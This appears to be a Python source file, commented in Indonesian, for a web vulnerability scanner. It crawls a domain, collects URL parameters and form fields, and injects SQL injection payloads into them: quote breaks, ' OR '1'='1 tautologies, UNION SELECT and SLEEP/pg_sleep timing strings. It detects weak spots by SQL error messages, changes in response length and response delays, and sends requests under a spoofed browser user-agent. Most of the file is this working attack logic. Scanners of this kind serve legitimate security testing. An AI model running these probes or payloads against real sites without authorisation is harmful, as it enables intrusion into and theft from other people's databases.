from bs4 import BeautifulSoup  # type: ignore
from urllib.parse import urlparse, urljoin
import logging
from typing import Optional, Callable
import urllib.robotparser
import requests
import time

class SitemapScanner:
    """
    Model untuk melakukan scraping dan analisis sitemap website
    """
    
    def __init__(self, 
                 base_url: str,
                 on_output: Optional[Callable] = None):
        """
        Inisialisasi scanner dengan URL dasar
        
        Args:
            base_url (str): URL dasar website yang akan di-scan
        """
        self.base_url = self._normalize_base_url(base_url)
        self.on_output = on_output
        self.parameters = {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
        
    def _log(self, message: str):
        """Helper untuk logging dengan callback"""
        print(message)
        if self.on_output:
            try:
                self.on_output(message)
            except Exception as e:
                print(f"[SitemapScanner] on_output callback error: {e}")
    
    def _normalize_base_url(self, url: str) -> str:
        """Pastikan base URL memiliki scheme (http/https) dan netloc yang benar."""
        if not url:
            return url
        p = urlparse(url)
        # Tambahkan https jika tidak ada scheme
        if not p.scheme:
            url = 'https://' + url.lstrip('/')
            p = urlparse(url)
        # Jika netloc kosong tapi path berisi domain (contoh: 'example.com')
        if not p.netloc and p.path:
            url = f"{p.scheme}://{p.path}"
        return url
    
    
    def extract_parameters(self, urls):
        """
        Ekstrak parameter dari URL untuk analisis kerentanan
        
        Args:
            urls (list): Daftar URL yang akan dianalisis
            
        Returns:
            dict: Parameter yang ditemukan dan URL terkait
        """
        parameters = {}
        
        for url in urls:
            parsed = urlparse(url)
            query = parsed.query
            
            if query:
                params = query.split('&')
                for param in params:
                    if '=' in param:
                        name = param.split('=')[0]
                        if name not in parameters:
                            parameters[name] = []
                        parameters[name].append(url)
        
        self.parameters = parameters
        return parameters
    
    def scan_for_sqli_vulnerabilities(self, parameters):
        """
        Melakukan pengujian dasar untuk kerentanan SQLi
        
        Args:
            parameters (dict): Parameter yang akan diuji
            
        Returns:
            list: Temuan potensial kerentanan berupa daftar objek {url, param, payload, evidence}
        """
        # Implementasi ringan berbasis payload umum dan deteksi pesan error SQL
        sqli_payloads = [
            "'",
            '"',
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR 1=1--",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "' UNION SELECT NULL--",
            "' OR 'x'='x",
        ]
        error_signatures = [
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "Unclosed quotation mark",
            "SQL syntax",
            "PDOException",
            "PostgreSQL",
            "MySQL",
            "ODBC",
            "SQL Server",
            "ORA-",
            "SQLiteException",
            "SQLSTATE",
            "syntax error at or near",
            "OperationalError",
            "ProgrammingError",
        ]

        findings = []

        # Batasi jumlah pengujian agar tidak terlalu agresif
        max_urls_per_param = 3
        max_payloads_per_param = 4
        # Delay-based detection config (best effort)
        sleep_seconds = 2.0
        delay_threshold = 1.2  # additional seconds beyond baseline considered suspicious

        for param_name, urls in parameters.items():
            for url in urls[:max_urls_per_param]:
                try:
                    parsed = urlparse(url)
                    # Ubah nilai parameter menjadi payload dan kirim request, deteksi error
                    original_qs = parsed.query
                    # Jika tidak ada query, lanjut
                    if not original_qs:
                        continue

                    # Pecah query jadi pasangan k=v
                    pairs = []
                    for kv in original_qs.split('&'):
                        if '=' in kv:
                            k, v = kv.split('=', 1)
                            pairs.append((k, v))

                    # Baseline response for comparison (with original query)
                    baseline_url = url
                    try:
                        base_start = time.monotonic()
                        base_resp = requests.get(baseline_url, headers=self.headers, timeout=7)
                        base_elapsed = time.monotonic() - base_start
                        base_text = base_resp.text[:50000]
                    except Exception:
                        base_elapsed = 0
                        base_text = ""

                    # Uji beberapa payload per URL
                    for payload in sqli_payloads[:max_payloads_per_param]:
                        mutated_pairs = [(k, (payload if k == param_name else v)) for (k, v) in pairs]
                        mutated_qs = '&'.join([f"{k}={v}" for (k, v) in mutated_pairs])
                        mutated_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{mutated_qs}"
                        try:
                            start = time.monotonic()
                            resp = requests.get(mutated_url, headers=self.headers, timeout=7)
                            elapsed = time.monotonic() - start
                            text = resp.text[:50000]  # batasi panjang yang dicek
                            # Cek signature error
                            if any(sig.lower() in text.lower() for sig in error_signatures):
                                findings.append({
                                    "url": mutated_url,
                                    "param": param_name,
                                    "payload": payload,
                                    "evidence": "SQL error signature detected",
                                })
                                # Jika sudah menemukan bukti dengan payload ini, lanjut ke payload berikutnya/URL berikutnya
                                continue
                            # Boolean-based: perbedaan panjang respon
                            try:
                                delta_len = abs(len(text) - len(base_text))
                                base_len = max(len(base_text), 1)
                                if delta_len / base_len > 0.25 and resp.status_code == base_resp.status_code:
                                    findings.append({
                                        "url": mutated_url,
                                        "param": param_name,
                                        "payload": payload,
                                        "evidence": "Response length significantly differs from baseline",
                                    })
                                    continue
                            except Exception:
                                pass
                            # Time-based (MySQL/Postgres)
                            try:
                                sleep_payloads = [
                                    f"1 AND SLEEP({sleep_seconds})",
                                    f"1 OR SLEEP({sleep_seconds})",
                                    f"1; SELECT pg_sleep({sleep_seconds})",
                                ]
                                for sp in sleep_payloads:
                                    mutated_pairs2 = [(k, (sp if k == param_name else v)) for (k, v) in pairs]
                                    mutated_qs2 = '&'.join([f"{k}={v}" for (k, v) in mutated_pairs2])
                                    mutated_url2 = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{mutated_qs2}"
                                    s_start = time.monotonic()
                                    r2 = requests.get(mutated_url2, headers=self.headers, timeout=7)
                                    s_elapsed = time.monotonic() - s_start
                                    if s_elapsed - base_elapsed > delay_threshold:
                                        findings.append({
                                            "url": mutated_url2,
                                            "param": param_name,
                                            "payload": sp,
                                            "evidence": f"Response delayed by ~{round(s_elapsed - base_elapsed, 2)}s vs baseline",
                                        })
                                        break
                            except Exception:
                                pass
                        except Exception:
                            # Abaikan error koneksi/timeouts agar scanner tetap berjalan
                            pass
                except Exception:
                    # Abaikan URL yang tidak dapat di-parse
                    continue

        return findings

    def scan_forms_for_sqli(self, urls):
        """
        Menguji kerentanan SQL injection melalui form pada halaman yang di-crawl.

        Args:
            urls (list[str]): Daftar URL halaman HTML yang akan diperiksa formulirnya.

        Returns:
            list[dict]: Temuan potensial berupa {url, source_page, method, field, payload, evidence}
        """
        sqli_payloads = [
            "'",
            '"',
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR 1=1--",
        ]
        error_signatures = [
            "You have an error in your SQL syntax",
            "Warning: mysql_",
            "Unclosed quotation mark",
            "SQL syntax",
            "PDOException",
            "PostgreSQL",
            "MySQL",
            "ODBC",
            "SQL Server",
            "ORA-",
            "SQLiteException",
            "SQLSTATE",
            "syntax error at or near",
            "OperationalError",
            "ProgrammingError",
        ]

        findings = []
        session = requests.Session()

        # Batasi intensitas pengujian
        max_forms_per_page = 3
        max_fields_per_form = 4
        max_payloads_per_field = 3
        sleep_seconds = 2.0
        delay_threshold = 1.2

        for page_url in urls:
            try:
                resp = session.get(page_url, headers=self.headers, timeout=10)
                if 'text/html' not in resp.headers.get('Content-Type', ''):
                    continue
                soup = BeautifulSoup(resp.text, 'html.parser')
                forms = soup.find_all('form')[:max_forms_per_page]

                for form in forms:
                    method = (form.get('method') or 'GET').upper()
                    action = form.get('action') or page_url
                    action_url = urljoin(page_url, action)

                    # Kumpulkan field input yang relevan
                    fields = []
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if not name:
                            continue
                        itype = (inp.get('type') or 'text').lower()
                        if itype in ['submit', 'button', 'image', 'file']:
                            continue
                        # Skip field umum untuk CSRF/token agar tidak memblokir request
                        if name.lower() in ['csrf', 'csrf_token', '_csrf', 'authenticity_token', 'token', '_token']:
                            continue
                        fields.append(name)

                    if not fields:
                        continue

                    fields = fields[:max_fields_per_form]

                    base_data = {f: 'test' for f in fields}

                    for field in fields:
                        for payload in sqli_payloads[:max_payloads_per_field]:
                            data = dict(base_data)
                            data[field] = payload
                            try:
                                # Baseline untuk dibandingkan
                                base_start = time.monotonic()
                                if method == 'POST':
                                    base_r = session.post(action_url, data={**base_data, field: 'baseline'}, headers=self.headers, timeout=7)
                                else:
                                    base_r = session.get(action_url, params={**base_data, field: 'baseline'}, headers=self.headers, timeout=7)
                                base_elapsed = time.monotonic() - base_start
                                base_text = base_r.text[:50000]

                                # Mutasi dengan payload
                                start = time.monotonic()
                                if method == 'POST':
                                    r2 = session.post(action_url, data=data, headers=self.headers, timeout=7)
                                else:
                                    r2 = session.get(action_url, params=data, headers=self.headers, timeout=7)
                                elapsed = time.monotonic() - start
                                text = r2.text[:50000]

                                # 1) Error signature
                                if any(sig.lower() in text.lower() for sig in error_signatures):
                                    findings.append({
                                        'url': action_url,
                                        'source_page': page_url,
                                        'method': method,
                                        'field': field,
                                        'payload': payload,
                                        'evidence': 'SQL error signature detected in form submission',
                                    })
                                    continue

                                # 2) Boolean-based
                                try:
                                    delta_len = abs(len(text) - len(base_text))
                                    base_len = max(len(base_text), 1)
                                    if delta_len / base_len > 0.25 and r2.status_code == base_r.status_code:
                                        findings.append({
                                            'url': action_url,
                                            'source_page': page_url,
                                            'method': method,
                                            'field': field,
                                            'payload': payload,
                                            'evidence': 'Response length significantly differs from baseline (form)',
                                        })
                                        continue
                                except Exception:
                                    pass

                                # 3) Time-based
                                try:
                                    sleep_payloads = [
                                        f"test' OR SLEEP({sleep_seconds}) -- ",
                                        f"test' OR '1'='1'; SELECT pg_sleep({sleep_seconds}) -- ",
                                    ]
                                    for sp in sleep_payloads:
                                        data2 = dict(base_data)
                                        data2[field] = sp
                                        s_start = time.monotonic()
                                        if method == 'POST':
                                            r3 = session.post(action_url, data=data2, headers=self.headers, timeout=7)
                                        else:
                                            r3 = session.get(action_url, params=data2, headers=self.headers, timeout=7)
                                        s_elapsed = time.monotonic() - s_start
                                        if s_elapsed - base_elapsed > delay_threshold:
                                            findings.append({
                                                'url': action_url,
                                                'source_page': page_url,
                                                'method': method,
                                                'field': field,
                                                'payload': sp,
                                                'evidence': f"Form submission delayed by ~{round(s_elapsed - base_elapsed, 2)}s vs baseline",
                                            })
                                            break
                                except Exception:
                                    pass
                            except Exception:
                                # Abaikan error koneksi/timeouts agar scanner tetap berjalan
                                pass
            except Exception:
                # Abaikan halaman yang gagal diambil
                continue

        return findings
    
    def same_root(self, url, root_domain, include_subdomains=True):
        h = urlparse(url).hostname or ""
        if include_subdomains:
            return h.endswith(root_domain)
        return h == root_domain

    def crawl_domain(self, max_pages=500, delay=0.5, include_subdomains=True):
        parsed = urlparse(self.base_url)
        root_domain = parsed.hostname
        rp = urllib.robotparser.RobotFileParser()
        rp.set_url(f"{parsed.scheme}://{root_domain}/robots.txt")
        try:
            rp.read()
        except Exception:
            pass

        session = requests.Session()
        to_visit = [self.base_url]
        visited = set()
        found = set()

        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            if rp.can_fetch("*", url) is False:
                # skip if robots disallow
                continue
            try:
                r = session.get(url, timeout=10)
            except Exception:
                continue
            if 'text/html' not in r.headers.get('Content-Type',''):
                continue
            soup = BeautifulSoup(r.text, "html.parser")
            found.add(url)
            # Emit setiap halaman yang berhasil dikunjungi
            try:
                self._log(url)
            except Exception:
                pass
            for a in soup.find_all("a", href=True):
                href = a['href'].strip()
                # normalize
                if href.startswith("mailto:") or href.startswith("tel:"):
                    continue
                next_url = urljoin(url, href)
                if self.same_root(next_url, root_domain, include_subdomains):
                    if next_url not in visited and next_url not in to_visit:
                        to_visit.append(next_url)
            time.sleep(delay)
        return sorted(found)
    
    def run_scan(self):
        """
        Menjalankan proses scanning lengkap
        
        Returns:
            dict: Hasil scanning
        """
        results = {
            "crawled_urls": [],
            "parameters": {},
            "potential_vulnerabilities": []
        }

        # Crawl domain menggunakan fungsi crawl_domain
        crawled = self.crawl_domain(max_pages=500, delay=0.5, include_subdomains=True)
        results["crawled_urls"] = crawled

        # Extract and analyze parameters dari hasil crawl saja
        parameters = self.extract_parameters(crawled)
        results["parameters"] = parameters
        
        # 5. Scan for vulnerabilities (aktifkan)
        vulnerabilities = self.scan_for_sqli_vulnerabilities(parameters)
        # Tambahkan pemeriksaan form untuk SQLi
        form_vulns = self.scan_forms_for_sqli(crawled)
        results["potential_vulnerabilities"] = vulnerabilities + form_vulns
        
        return results